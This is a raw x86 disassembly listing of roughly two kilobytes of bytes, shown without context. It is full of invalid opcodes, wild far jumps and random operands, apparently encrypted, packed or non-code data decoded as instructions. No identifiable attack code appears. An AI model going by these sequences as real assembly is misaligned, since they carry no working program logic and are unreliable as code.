  418ffb:	dec    edx
  418ffc:	jne    0x419022
  418ffe:	stos   DWORD PTR es:[edi],eax
  418fff:	push   edx
  419000:	stc    
  419001:	add    DWORD PTR [esi],ebx
  419003:	dec    ecx
  419004:	std    
  419005:	je     0x419066
  419007:	dec    ecx
  419008:	xchg   DWORD PTR [edi+ebx*2+0x41],eax
  41900c:	dec    esp
  41900d:	mov    edi,DWORD PTR ds:0x242d6a89
  419013:	data16 add al,0xff
  419016:	outs   dx,BYTE PTR ds:[esi]
  419017:	ins    DWORD PTR es:[edi],dx
  419018:	mov    DWORD PTR [esi+0x6f],eax
  41901b:	dec    esp
  41901c:	inc    ecx
  41901d:	or     BYTE PTR [edx],ah
  41901f:	xlat   BYTE PTR ds:[ebx]
  419020:	sti    
  419021:	dec    DWORD PTR [ebx+0x20]
  419024:	imul   ecx,DWORD PTR [eax+0x44],0x59
  419028:	cmc    
  419029:	add    BYTE PTR [ebx],bh
  41902b:	xlat   BYTE PTR ds:[ebx]
  41902c:	xor    edx,DWORD PTR [ebx+0xd587]
  419032:	nop
  419033:	adc    DWORD PTR [eax],esp
  419035:	inc    esp
  419036:	xchg   edx,eax
  419037:	les    ecx,FWORD PTR [eax-0x76290500]
  41903d:	push   esp
  41903e:	pop    ds
  41903f:	ja     0x3a8dab8c
  419045:	mov    eax,DWORD PTR [eax]
  419047:	mov    edi,0x6289341a
  41904c:	ins    BYTE PTR es:[edi],dx
  41904d:	fcomp  QWORD PTR [ebx]
  41904f:	fnstenv [esp+ebx*8+0x3f]
  419053:	jmp    0x4190c1
  419055:	fcomp  QWORD PTR [edi]
  419057:	jmp    0xdb916cd0
  41905c:	ins    BYTE PTR es:[edi],dx
  41905d:	fsubr  QWORD PTR [ebx]
  41905f:	xlat   BYTE PTR ds:[ebx]
  419060:	je     0x41903e
  419062:	sbb    ebp,ebx
  419064:	test   ah,bl
  419066:	and    edx,DWORD PTR [edx]
  419068:	lods   eax,DWORD PTR ds:[esi]
  419069:	leave  
  41906a:	outs   dx,DWORD PTR ds:[esi]
  41906b:	fstp   TBYTE PTR [esp+ebx*8+0x2b]
  41906f:	mov    edx,0x9dffa363
  419074:	jmp    0x418ffb
  419076:	mov    WORD PTR [edx+0x30],fs
  419079:	add    BYTE PTR [ecx],al
  41907b:	bound  esi,QWORD PTR [eax]
  41907d:	add    BYTE PTR [ebx-0x467b3fe3],cl
  419083:	out    dx,al
  419084:	xor    BYTE PTR [eax],al
  419086:	add    BYTE PTR [ecx-0x5b],ah
  419089:	hlt    
  41908a:	push   eax
  41908b:	adc    bh,bl
  41908d:	scas   al,BYTE PTR es:[edi]
  41908e:	cld    
  41908f:	out    dx,al
  419090:	ror    eax,cl
  419092:	dec    esi
  419093:	jmp    0x5671b91c
  419098:	jnp    0x4190b3
  41909a:	or     DWORD PTR [ecx],0x62ffffb4
  4190a0:	xor    al,0x9
  4190a2:	add    DWORD PTR [eax+esi*1],0x0
  4190a6:	add    bh,ah
  4190a8:	repz loopne 0x4190e6
  4190ab:	add    BYTE PTR [edx-0x3117b349],dl
  4190b1:	mov    ebx,0xe3e9ffff
  4190b6:	loopne 0x4190f7
  4190b8:	jmp    0x8d380b7c
  4190bd:	repz jnp 0x4190ab
  4190c0:	mov    ?,WORD PTR [eax]
  4190c2:	lea    eax,[ebx+0x56]
  4190c5:	fldcw  WORD PTR [esi-0x3a]
  4190c8:	dec    ebp
  4190c9:	cs pop es
  4190cb:	lea    esp,[esi+0x227eadf5]
  4190d1:	(bad)  
  4190d2:	repnz pop ebp
  4190d4:	(bad)  
  4190d5:	stc    
  4190d6:	jmp    0xda1a9dde
  4190db:	add    esp,DWORD PTR [edx+0x31]
  4190de:	ss mov al,0xc5
  4190e1:	cmp    DWORD PTR [edi+0x4b],ebx
  4190e4:	jmp    0x41907a
  4190e6:	int    0xbf
  4190e8:	retf   0x6ed4
  4190eb:	mov    DWORD PTR [ecx+0x5749ce91],0xa27e1897
  4190f5:	(bad)  
  4190f6:	fidiv  DWORD PTR [ecx-0x3c3a3b6a]
  4190fc:	sbb    eax,0x6fb7dd3a
  419101:	cdq    
  419102:	jmp    0x6f0e378b
  419107:	dec    ebx
  419108:	or     al,0x31
  41910a:	inc    esp
  41910b:	sub    BYTE PTR [edx-0x27],ah
  41910e:	pop    esi
  41910f:	rol    BYTE PTR [eax],0x41
  419112:	lea    esp,[esp+eax*2-0x2a]
  419116:	(bad)  [eax-0x2c]
  419119:	loopne 0x419161
  41911b:	ss add esp,ebp
  41911e:	scas   al,BYTE PTR es:[edi]
  41911f:	rcl    edx,1
  419121:	dec    edi
  419122:	mov    al,ds:0x9deaebbe
  419127:	int    0xd7
  419129:	ss scas al,BYTE PTR es:[edi]
  41912b:	lds    ebp,FWORD PTR [edi-0x503251d2]
  419131:	es scas al,BYTE PTR es:[edi]
  419133:	lds    ebp,FWORD PTR [edi-0x503251e2]
  419139:	push   ss
  41913a:	scas   al,BYTE PTR es:[edi]
  41913b:	lds    ebp,FWORD PTR [edi-0x32ff51f2]
  419141:	mov    ch,0xa8
  419143:	sti    
  419144:	cmc    
  419145:	sbb    eax,0xab72518d
  41914a:	inc    ecx
  41914b:	push   ecx
  41914c:	pop    esp
  41914d:	push   ebp
  41914e:	mov    BYTE PTR ss:[ecx-0x27],bl
  419152:	es jmp 0xfc77572f
  419158:	push   eax
  419159:	sbb    DWORD PTR [edi],esi
  41915b:	cld    
  41915c:	ds mov cl,0x78
  41915f:	push   ecx
  419160:	cdq    
  419161:	ins    BYTE PTR es:[edi],dx
  419162:	lods   eax,DWORD PTR ds:[esi]
  419163:	and    al,0xd1
  419165:	push   esp
  419166:	lods   eax,DWORD PTR ds:[esi]
  419167:	and    al,0x1
  419169:	dec    ebp
  41916a:	lods   eax,DWORD PTR ds:[esi]
  41916b:	and    al,0x1
  41916d:	div    BYTE PTR ds:0x57adcd75
  419173:	popf   
  419174:	add    BYTE PTR [eax],0xdd
  419177:	cmp    bl,bh
  419179:	jns    0x419124
  41917b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41917c:	call   0xfc77fc19
  419181:	sub    ecx,DWORD PTR [esi-0x628a04c8]
  419187:	call   0xad8e3abb
  41918c:	and    al,0xf9
  41918e:	mov    cl,0xa8
  419190:	push   eax
  419191:	(bad)  
  419192:	aad    0xfc
  419194:	sbb    al,0x88
  419196:	aad    0xc2
  419198:	inc    esp
  419199:	jmp    0xdd663f0a
  41919e:	je     0x419149
  4191a0:	dec    esp
  4191a1:	sbb    BYTE PTR [esi+0x2],dh
  4191a4:	(bad)  
  4191a5:	scas   al,BYTE PTR es:[edi]
  4191a6:	push   esp
  4191a7:	sbb    edx,DWORD PTR [ecx]
  4191a9:	jmp    0xf9663efa
  4191ae:	adc    BYTE PTR [eax-0x4],bh
  4191b1:	sbb    eax,0x3950e842
  4191b6:	(bad)  
  4191b7:	xor    al,0x75
  4191b9:	add    BYTE PTR [edi],ah
  4191bb:	xor    BYTE PTR [ebx-0x3e68f64],bl
  4191c1:	inc    BYTE PTR [edi]
  4191c3:	sbb    BYTE PTR [eax],bl
  4191c5:	(bad)  
  4191c6:	sti    
  4191c7:	imul   ecx,DWORD PTR [ebx-0x18],0x6
  4191cb:	sar    ebp,1
  4191cd:	(bad)  
  4191ce:	cmp    DWORD PTR [esp+edi*8],ebp
  4191d1:	inc    BYTE PTR [edi]
  4191d3:	sbb    BYTE PTR [ebx+esi*1],cl
  4191d6:	mov    ecx,edi
  4191d8:	je     0x4191fe
  4191da:	add    BYTE PTR [ebx-0x54db8b32],bh
  4191e0:	imul   ecx,DWORD PTR [eax+edx*2-0x74],0x68
  4191e5:	and    BYTE PTR [edx+ebp*8],bl
  4191e8:	scas   eax,DWORD PTR es:[edi]
  4191e9:	imul   eax,DWORD PTR [ebx+ecx*8-0x32],0x3ea5470
  4191f1:	fdivp  st(4),st
  4191f3:	dec    esp
  4191f4:	iret   
  4191f5:	mov    esi,0x89688b10
  4191fa:	in     al,dx
  4191fb:	cli    
  4191fc:	push   0x56
  4191fe:	push   edi
  4191ff:	adc    BYTE PTR [ecx],dl
  419201:	cwde   
  419202:	imul   esi,DWORD PTR [edi-0x46941725],0xffffffce
  419209:	std    
  41920a:	mov    edx,DWORD PTR [esi]
  41920c:	sub    eax,0xf207d88a
  419211:	je     0x419249
  419213:	and    ebp,ebx
  419215:	data16 add BYTE PTR [ebp+0xc8afb83],dl
  41921c:	push   es
  41921d:	cld    
  41921e:	sar    DWORD PTR [ebx],1
  419220:	fisttp DWORD PTR [ecx+0x74ccb6f8]
  419226:	and    cl,BYTE PTR [eiz*4-0x24b4fddc]
  41922d:	mov    edi,ecx
  41922f:	rol    ebp,cl
  419231:	add    BYTE PTR [bp+si+0x40],ah
  419235:	jnp    0x4191f7
  419237:	xchg   esi,eax
  419238:	cmp    cl,BYTE PTR [ecx+0x44c5ae40]
  41923e:	je     0x419240
  419240:	popa   
  419241:	stos   DWORD PTR es:[edi],eax
  419242:	xchg   esp,eax
  419243:	pop    es
  419244:	fnstcw WORD PTR [edi+0x2d]
  419247:	mov    BYTE PTR [ecx-0x39],cl
  41924a:	adc    eax,0x15e06ffd
  41924f:	jae    0x41929f
  419251:	xchg   edi,eax
  419252:	mov    edx,DWORD PTR [edi]
  419254:	in     eax,0x15
  419256:	in     al,dx
  419257:	push   ebp
  419258:	(bad)  [ebp+0x4]
  41925b:	mov    edx,edx
  41925d:	les    edi,FWORD PTR [ecx]
  41925f:	je     0x4192c8
  419261:	mov    BYTE PTR [ebx-0x4a103acf],dh
  419267:	mov    BYTE PTR [esi+eiz*2-0x235f3947],ah
  41926e:	add    al,0x53
  419270:	ftst   
  419272:	adc    eax,0x78a14a73
  419277:	imul   esp,DWORD PTR [esi],0x6e731540
  41927d:	fisttp WORD PTR [ebx+0x3ad8d0f]
  419283:	std    
  419284:	(bad)  
  419287:	jo     0x4192a3
  419289:	push   ecx
  41928a:	sub    BYTE PTR [ecx+0x75],ch
  41928d:	aas    
  41928e:	adc    eax,0x2ca05b
  419293:	push   ebx
  419294:	fstp   DWORD PTR [edx*1+0x74617a73]
  41929b:	imul   ebx,DWORD PTR [esi+0x76731540],0xf8b77
  4192a5:	inc    ebp
  4192a6:	cmc    
  4192a7:	or     ch,bh
  4192a9:	mov    bh,0x38
  4192ab:	adc    eax,0x38d99670
  4192b0:	sub    al,0xa7
  4192b2:	ss fwait
  4192b4:	adc    al,0x89
  4192b6:	sbb    edi,esi
  4192b8:	add    esi,DWORD PTR [ecx+0x6807e62]
  4192be:	aad    0x74
  4192c0:	scas   al,BYTE PTR es:[edi]
  4192c1:	add    eax,0x7bad138a
  4192c6:	add    DWORD PTR [edi+0x12],ebx
  4192c9:	xchg   ebp,eax
  4192ca:	inc    ecx
  4192cb:	mov    edi,0x6f35f6e8
  4192d0:	xchg   esi,eax
  4192d1:	pop    ecx
  4192d2:	(bad)  
  4192d3:	std    
  4192d4:	rcl    DWORD PTR [ebx-0x67],cl
  4192d7:	jmp    0xba82b462
  4192dc:	lods   al,BYTE PTR ds:[esi]
  4192dd:	(bad)  
  4192de:	or     DWORD PTR [ecx-0x43],esi
  4192e1:	jge    0x41933f
  4192e3:	sub    cl,BYTE PTR [esi+0x2a29eb5e]
  4192e9:	cwde   
  4192ea:	xlat   BYTE PTR ds:[ebx]
  4192eb:	jmp    0x7541daf3
  4192f0:	scas   al,BYTE PTR es:[edi]
  4192f1:	mov    ecx,0x7b01118f
  4192f6:	adc    eax,DWORD PTR ss:[esi-0x5345badf]
  4192fd:	xchg   esi,eax
  4192fe:	or     DWORD PTR [ecx-0x43],esi
  419301:	push   ecx
  419302:	pop    esp
  419303:	sub    cl,BYTE PTR [edi-0x79403d5b]
  419309:	add    BYTE PTR [ecx],dl
  41930b:	inc    ebp
  41930c:	xchg   ecx,eax
  41930d:	sub    edi,DWORD PTR [ebp+0x2]
  419310:	jecxz  0x419325
  419312:	fstp   DWORD PTR [ebx+0x360eb4cd]
  419318:	mov    bh,0x7d
  41931a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41931b:	icebp  
  41931c:	fs inc esp
  41931e:	into   
  41931f:	sbb    al,0x50
  419321:	(bad)  
  419323:	mov    cs,ebp
  419325:	lods   eax,DWORD PTR ds:[esi]
  419326:	cmp    eax,0x5103010a
  41932b:	mov    fs,WORD PTR ss:[edx+eax*4]
  41932f:	mov    DWORD PTR [ebx-0x5a],edx
  419332:	jne    0x419390
  419334:	inc    ebx
  419335:	fstp   st(2)
  419337:	sbb    DWORD PTR [ebp+0x47],esi
  41933a:	cld    
  41933b:	add    BYTE PTR [esi-0x1773bdcc],cl
  419341:	ds sub al,0x36
  419344:	cld    
  419345:	ins    BYTE PTR es:[edi],dx
  419346:	sbb    eax,DWORD PTR [ecx+0x51]
  419349:	push   ds
  41934a:	push   ecx
  41934b:	or     cl,BYTE PTR [edx-0x3ea7e1d9]
  419351:	(bad)  [edx-0x41]
  419354:	sub    eax,0x5a40ab6c
  419359:	inc    ecx
  41935a:	push   eax
  41935b:	(bad)  
  41935c:	sti    
  41935d:	dec    esi
  41935e:	jecxz  0x4192f8
  419360:	in     al,dx
  419361:	cdq    
  419362:	or     BYTE PTR [esi],dh
  419364:	shl    BYTE PTR [eax-0x68],1
  419367:	cwde   
  419368:	test   DWORD PTR [ecx],ebp
  41936a:	popa   
  41936b:	pop    ebp
  41936c:	jns    0x41939c
  41936e:	add    BYTE PTR [ecx+0x36],dl
  419371:	xlat   BYTE PTR ds:[bx]
  419373:	loop   0x4192fd
  419375:	in     al,dx
  419376:	ror    BYTE PTR [ecx-0x4c],0x26
  41937a:	push   ss
  41937b:	jno    0x4193dd
  41937d:	inc    esi
  41937e:	std    
  41937f:	ror    DWORD PTR [ebp-0x64f0e505],1
  419385:	dec    eax
  419386:	fs push ds
  419388:	out    0x84,al
  41938a:	xchg   edx,eax
  41938b:	push   eax
  41938c:	ss cld 
  41938e:	add    DWORD PTR [eax-0x412ea9a1],0x3c
  419395:	adc    edx,DWORD PTR gs:[ecx+0x36]
  419399:	mov    gs,WORD PTR [esi+edi*2]
  41939c:	mov    DWORD PTR [ebx-0x32],edx
  41939f:	mov    WORD PTR [ebx+eax*2+0x0],ds
  4193a3:	xchg   edi,eax
  4193a4:	(bad)
  4193a9:	std    
  4193aa:	push   esp
  4193ac:	push   ebp
  4193ad:	sub    al,0x8d
  4193af:	dec    esi
  4193b0:	aad    0x53
  4193b2:	call   0x3ea733
  4193b7:	mov    dh,0x21
  4193b9:	in     al,0x50
  4193bb:	pop    esp
  4193bc:	enter  0x89d1,0x3d
  4193c0:	ins    DWORD PTR es:[edi],dx
  4193c1:	jg     0x419383
  4193c3:	adc    al,0x5c
  4193c5:	sbb    al,0xff
  4193c7:	test   bh,al
  4193c9:	xor    WORD PTR [esi-0x1ca61f8f],ax
  4193d0:	adc    eax,0x8400ff2a
  4193d5:	pop    ecx
  4193d6:	inc    eax
  4193d7:	in     al,0xab
  4193d9:	outs   dx,BYTE PTR ds:[esi]
  4193da:	std    
  4193db:	rol    DWORD PTR [edx+0x22],cl
  4193de:	push   eax
  4193df:	test   DWORD PTR [ebx+0x240484d7],ecx
  4193e5:	(bad)  
  4193e6:	std    
  4193e7:	push   0xffffffc9
  4193e9:	pop    eax
  4193ea:	push   eax
  4193eb:	lock ror bh,cl
  4193ee:	pop    es
  4193ef:	sub    al,BYTE PTR [edi+eax*8+0x684b4587]
  4193f6:	push   ebp
  4193f7:	jmp    FWORD PTR [eax-0x4b]
  4193fa:	inc    edx
  4193fb:	pop    eax
  4193fc:	push   cs
  4193fd:	cwde   
  4193fe:	or     eax,0xfdca5c84
  419403:	push   ecx
  419405:	or     al,BYTE PTR [edi-0x1b8074ab]
  41940b:	lock mov ds:0xbe8dfdc6,al
  419411:	(bad)  
  419412:	push   eax
  419413:	push   edi
  419414:	test   ch,ch
  419416:	add    DWORD PTR [esi+0x27],0x5c
  41941a:	ror    DWORD PTR [edi],0x62
  41941d:	les    edi,FWORD PTR [edx]
  41941f:	(bad)  
  419420:	push   ebp
  419421:	and    al,0x9b
  419423:	xor    ebx,edi
  419425:	aad    0x1c
  419427:	push   edi
  419428:	cmp    dl,BYTE PTR [eax-0x28]
  41942b:	cld    
  41942c:	cmp    eax,0x92e7c3be
  419431:	retf   
  419432:	adc    ecx,edx
  419434:	fild   DWORD PTR [edx]
  419436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419437:	add    BYTE PTR [eax],0x22
  41943a:	inc    esp
  41943b:	test   BYTE PTR [ebx+0x6a124c1c],ch
  419441:	dec    edi
  419442:	xchg   ebp,eax
  419443:	mov    bl,0xe7
  419445:	stos   DWORD PTR es:[edi],eax
  419446:	dec    eax
  419447:	push   edi
  419448:	daa    
  419449:	add    eax,0xa437bb4
  41944e:	sar    DWORD PTR [ecx-0x3945ee04],1
  419454:	arpl   di,sp
  419456:	add    BYTE PTR [edx],al
  419458:	test   dl,dl
  41945a:	xchg   edx,eax
  41945b:	adc    ebp,edi
  41945d:	dec    eax
  41945e:	sar    BYTE PTR [ebx+0x53],cl
  419461:	(bad)  
  419462:	imul   ebx,DWORD PTR [eax],0x119b7b97
  419468:	mov    ebx,DWORD PTR [edi]
  41946a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41946b:	mov    ah,0x54
  41946d:	mov    ebp,0x4a4677cf
  419472:	mov    ebp,0x4fe60d44
  419477:	adc    bh,ch
  419479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41947a:	inc    esi
  41947b:	(bad)  [edx-0x185827c9]
  419481:	push   ss
  419482:	sbb    DWORD PTR [ecx],edx
  419484:	std    
  419485:	fild   WORD PTR [ebp+0x332d5018]
  41948b:	xor    eax,0x835c2487
  419490:	shl    BYTE PTR [ebp-0x44],0xb6
  419494:	std    
  419495:	ins    DWORD PTR es:[edi],dx
  419496:	(bad)  
  419498:	popf   
  419499:	sub    eax,0x1c3564
  41949e:	mov    ch,0x41
  4194a0:	xor    ebx,ebx
  4194a2:	push   esi
  4194a3:	xor    bl,BYTE PTR [ebp-0x3a]
  4194a6:	inc    ebp
  4194a7:	mov    DWORD PTR [edx],ebx
  4194a9:	adc    DWORD PTR [ebx],esi
  4194ab:	pusha  
  4194ac:	and    al,0x94
  4194ae:	loopne 0x4194c8
  4194b0:	jecxz  0x419439
  4194b2:	ins    DWORD PTR es:[edi],dx
  4194b3:	xor    ebp,DWORD PTR [ebx+0x74f0b810]
  4194b9:	mov    dh,0x3d
  4194bb:	nop
  4194bc:	xchg   ecx,eax
  4194bd:	lds    eax,FWORD PTR [edx+esi*1-0x6d]
  4194c1:	jle    0x419464
  4194c3:	inc    ecx
  4194c4:	cmp    bh,BYTE PTR [ecx+0x436d060e]
  4194ca:	fstp   QWORD PTR [edx+0x18d100f5]
  4194d0:	adc    esi,DWORD PTR [edx-0x457df66]
  4194d6:	in     eax,dx
  4194d7:	mov    WORD PTR [esi+0x1f],gs
  4194da:	xchg   ebp,eax
  4194db:	sub    esp,ebp
  4194dd:	jbe    0x41952a
  4194df:	popf   
  4194e0:	jmp    0x509fc3e7
  4194e5:	xchg   edi,eax
  4194e6:	out    0x29,ax
  4194e9:	sbb    cl,BYTE PTR [eax]
  4194eb:	fsubr  st,st(1)
  4194ed:	add    edx,DWORD PTR [ebx]
  4194ef:	mov    ebx,DWORD PTR [esi-0x2a]
  4194f2:	fnstcw WORD PTR [ebp+0xe7303a5]
  4194f8:	ins    DWORD PTR es:[edi],dx
  4194f9:	sbb    DWORD PTR [ecx],esi
  4194fb:	call   0xd9a3fc91
  419500:	jmp    0xebd795b9
  419505:	mov    eax,ds:0x2d92190
  41950a:	test   BYTE PTR [ecx-0x1efc5638],0x18
  419511:	add    DWORD PTR [ebp+0x76],edi
  419514:	pusha  
  419515:	leave  
  419516:	add    DWORD PTR [ebx-0x161903c6],esi
  41951c:	sub    al,ch
  41951e:	jmp    0x4194f8
  419520:	sub    al,BYTE PTR [esi+0x7e5d55df]
  419526:	call   0x2d046e8c
  41952b:	push   ebp
  41952c:	xor    bh,ah
  41952e:	jmp    0x61ef:0x1efb94b9
  419535:	retf   
  419536:	shr    DWORD PTR [edi-0x255903cc],0x19
  41953d:	or     al,0x65
  41953f:	(bad)  
  419540:	das    
  419541:	cld    
  419542:	jmp    0x8e6cf6c0
  419547:	pop    ebp
  419548:	push   ebp
  419549:	shl    esi,0xdd
  41954c:	call   0xe5ed:0x5a61e901
  419553:	loop   0x4194f4
  419555:	xor    BYTE PTR [ebx],dh
  419557:	stc    
  419558:	les    eax,FWORD PTR [ecx-0x17]
  41955b:	dec    ecx
  41955c:	pop    esp
  41955d:	jg     0x419547
  41955f:	popa   
  419560:	pop    esp
  419561:	shl    esi,0xea
  419564:	cmp    eax,0x6100e901
  419569:	pop    edx
  41956a:	in     eax,dx
  41956b:	cmc    
  41956c:	loop   0x41950d
  41956e:	xor    al,0x83
  419570:	mov    esp,0x59e941a5
  419575:	les    edi,FWORD PTR [esi-0x18]
  419578:	popa   
  419579:	pop    esp
  41957a:	shl    esi,0xda
  41957d:	add    eax,0x5a61e901
  419582:	in     eax,dx
  419583:	in     eax,0xe2
  419585:	lahf   
  419586:	cmp    BYTE PTR [ebx-0x49],dl
  419589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41958a:	inc    ecx
  41958b:	add    BYTE PTR [ebx-0x2c],bh
  41958e:	dec    edi
  41958f:	or     BYTE PTR [edx+0x7cc07fdc],0x61
  419596:	mov    ebp,0x81dc7b00
  41959b:	in     al,dx
  41959c:	outs   dx,DWORD PTR ds:[esi]
  41959d:	pop    ecx
  41959e:	dec    ebx
  41959f:	cmp    al,0x1
  4195a1:	push   0xd44b4175
  4195a6:	aaa    
  4195a7:	cmp    BYTE PTR [edx],0xdc
  4195aa:	jg     0x41956c
  4195ac:	dec    esp
  4195ad:	popa   
  4195ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195af:	add    BYTE PTR [ebx-0x24],cl
  4195b2:	sub    esp,0x404b593f
  4195b8:	mov    cl,0x47
  4195ba:	jne    0x4195fd
  4195bc:	cmp    edx,esp
  4195be:	pop    ds
  4195bf:	or     BYTE PTR [edx],0xdc
  4195c2:	jg     0x419584
  4195c4:	cld    
  4195c5:	pusha  
  4195c6:	lea    eax,[eax]
  4195c8:	sti    
  4195c9:	fild   DWORD PTR [ecx+0x590f00ec]
  4195cf:	dec    ebx
  4195d0:	inc    esp
  4195d1:	mov    eax,ds:0xb4178e2
  4195d6:	aam    0x7
  4195d8:	cmp    dl,0xdb
  4195db:	jg     0x41959d
  4195dd:	push   es
  4195de:	fs sub esp,0x484b58cf
  4195e5:	icebp  
  4195e6:	js     0x419666
  4195e8:	inc    ecx
  4195e9:	mov    ebx,0xba81f3d3
  4195ee:	fstp   TBYTE PTR [edi-0x40]
  4195f1:	div    BYTE PTR [edi-0x7f]
  4195f4:	in     al,dx
  4195f5:	mov    edi,0x314c4b58
  4195fa:	stos   DWORD PTR es:[edi],eax
  4195fb:	jp     0x41963e
  4195fd:	mov    ebx,0x8a81dfd3
  419602:	fstp   TBYTE PTR [edi-0x40]
  419605:	bound  ecx,QWORD PTR [ebp-0x50]
  419608:	cmp    BYTE PTR [esi+0xd],0x81
  41960c:	dec    esi
  41960d:	xor    bl,BYTE PTR [esp+ecx*2+0x1842237e]
  419614:	iret   
  419615:	jecxz  0x419657
  419617:	add    BYTE PTR [ebx-0x7f345b5e],al
  41961d:	jbe    0x419644
  41961f:	jnp    0x41966f
  419621:	mov    dh,0x7a
  419623:	cs jle 0x4195c9
  419626:	inc    eax
  419627:	sbb    BYTE PTR [ebx-0x7cffbe1d],bh
  41962d:	and    ch,dh
  41962f:	fadd   QWORD PTR [eax+0x7b3d4e00]
  419635:	dec    esi
  419636:	call   0x1840:0xa37c86aa
  41963d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41963e:	jecxz  0x419681
  419640:	add    BYTE PTR [ebx-0x7f0739de],al
  419646:	push   es
  419647:	xor    eax,0x8aae4e7b
  41964c:	push   0x7d
  41964e:	mov    ds:0xe3931840,eax
  419653:	inc    ecx
  419654:	add    BYTE PTR [ebx-0x4efdd2de],al
  41965a:	arpl   WORD PTR [ebx+0x5457873a],di
  419660:	call   0x7873:0x29b46243
  419667:	cwde   
  419668:	push   0x889fcd2b
  41966d:	ror    BYTE PTR [esi+0x2b],0x80
  419671:	or     edx,edi
  419673:	or     eax,esp
  419675:	jmp    DWORD PTR [edx-0x50]
  419678:	(bad)  
  419679:	call   0x9c3d51ee
  41967e:	cmp    ecx,ebx
  419680:	lods   eax,DWORD PTR ds:[esi]
  419681:	add    ebp,eax
  419683:	mov    WORD PTR [edx],ds
  419685:	rcl    ebp,1
  419687:	push   ebp
  419688:	das    
  419689:	std    
  41968a:	and    BYTE PTR [ecx],ah
  41968c:	popa   
  41968d:	(bad)  
  41968e:	jmp    0x8a454455
  419693:	ror    ah,0xc
  419696:	add    BYTE PTR [edi+0x42],dh
  419699:	out    0x79,eax
  41969b:	or     DWORD PTR [esi],ebp
  41969d:	sub    si,bp
  4196a0:	fsubr  QWORD PTR [ebp+edx*1-0x2a]
  4196a4:	loope  0x419714
  4196a6:	add    eax,0x3d5ed8c8
  4196ab:	dec    edi
  4196ac:	leave  
  4196ad:	pop    ss
  4196ae:	inc    esp
  4196af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b0:	xchg   edx,eax
  4196b1:	and    bh,BYTE PTR [ebx]
  4196b3:	and    ecx,DWORD PTR [edx+0x628eb614]
  4196b9:	mov    cl,0x7e
  4196bb:	mov    bh,0xb1
  4196bd:	adc    ecx,DWORD PTR ds:0xc3f79d51
  4196c3:	sbb    eax,0x626f4b63
  4196c8:	fldl2t 
  4196ca:	shr    BYTE PTR [edx],1
  4196cc:	bound  ebx,QWORD PTR [edi-0x205b067a]
  4196d2:	js     0x4196bb
  4196d4:	push   eax
  4196d5:	jmp    0x51e8:0x1e626203
  4196dc:	lock frndint 
  4196df:	loope  0x41972c
  4196e1:	jmp    0x5e43:0x66986203
  4196e8:	repnz and al,0x91
  4196eb:	mov    ebp,0x62736aef
  4196f0:	fldl2t 
  4196f2:	xchg   esi,eax
  4196f3:	push   esi
  4196f4:	mov    dl,BYTE PTR [esi+0x12db49b]
  4196fa:	in     eax,dx
  4196fb:	add    BYTE PTR [ecx+0x2c],ah
  4196fe:	push   ss
  4196ff:	loope  0x4196b1
  419701:	in     eax,dx
  419702:	add    BYTE PTR [eax-0x1a],dh
  419705:	dec    eax
  419706:	add    ecx,ebp
  419708:	popa   
  419709:	pop    edx
  41970a:	rcr    DWORD PTR [ebp-0x45f84022],0x56
  419711:	fs xchg ecx,eax
  419713:	jmp    0xd53d7079
  419718:	gs leave 
  41971a:	inc    eax
  41971b:	jmp    0xfcc7d80a
  419720:	int3   
  419721:	mov    edi,0xc9425dfb
  419726:	lea    ebp,[esi-0x2e]
  419729:	fld    DWORD PTR [eax]
  41972b:	jmp    0x3a3cc3fc
  419730:	dec    esi
  419731:	pop    edx
  419732:	stc    
  419733:	(bad)  
  419734:	rcr    esp,cl
  419736:	push   ebp
  419737:	sbb    ch,BYTE PTR [ecx+0x66]
  41973a:	xchg   ecx,eax
  41973b:	jmp    0xd53d70a1
  419740:	popa   
  419741:	fadd   QWORD PTR [eax-0x17]
  419744:	jl     0x4196d9
  419746:	xchg   DWORD PTR ds:0x2cc2c902,esp
  41974c:	outs   dx,WORD PTR ds:[esi]
  41974e:	mov    ah,BYTE PTR [edi+ebx*2]
  419751:	adc    eax,DWORD PTR [esi-0x14]
  419754:	fst    DWORD PTR ds:0xbed0e746
  41975a:	inc    ecx
  41975b:	jmp    0xaa483003
  419760:	add    BYTE PTR [esi-0x5b],al
  419763:	sub    al,0x66
  419765:	imul   edx,DWORD PTR [ebp-0x3f],0xed59bcd5
  41976c:	in     eax,0x4c
  41976e:	or     BYTE PTR [esi+0x79415e9c],cl
  419774:	add    BYTE PTR [ebx-0x2a],cl
  419777:	add    BYTE PTR [ebp-0x17f8b575],al
  41977d:	push   cs
  41977e:	adc    ebp,edi
  419780:	(bad)  
  419781:	aas    
  419782:	xchg   ebp,eax
  419783:	je     0x419789
  419785:	cmp    dh,dl
  419787:	jmp    0x288a0a91
  41978c:	push   DWORD PTR [edi+eiz*2-0x3]
  419790:	adc    eax,0x3c26bb
  419795:	les    eax,FWORD PTR [edx+0x7c488a57]
  41979b:	ret    0x7b04
  41979e:	imul   ecx,DWORD PTR [ecx+0x5165caec],0x849d056
  4197a8:	push   edi
  4197a9:	mov    cl,0xd9
  4197ab:	mov    ecx,edi
  4197ad:	nop
  4197ae:	mov    dl,0x3f
  4197b0:	or     al,0x8b
  4197b2:	mov    dl,0x3f
  4197b4:	cld    
  4197b5:	pop    ebx
  4197b6:	dec    ebx
  4197b7:	sti    
  4197b8:	push   ebp
  4197b9:	mov    dl,0x81
  4197bb:	or     bh,bh
  4197bd:	dec    esp
  4197be:	jne    0x419741
  4197c0:	clc    
  4197c1:	cmp    cl,BYTE PTR [ecx+0x10]
  4197c4:	add    DWORD PTR [eax],0x46
  4197c7:	loope  0x4197c9
  4197c9:	je     0x4197d0
  4197cb:	fild   QWORD PTR [edi-0x4]
  4197ce:	sub    bh,0xe8
  4197d1:	in     al,0xd5
  4197d3:	fdivp  st(5),st
  4197d5:	test   bl,cl
  4197d7:	pop    ebx
  4197d8:	pop    ds
  4197d9:	lea    edi,[esi]
  4197db:	xor    DWORD PTR [ebp+ecx*4+0x3e],ecx
  4197df:	fst    QWORD PTR [eax+0x6a]
  4197e2:	push   cs
  4197e3:	push   0xffffff83
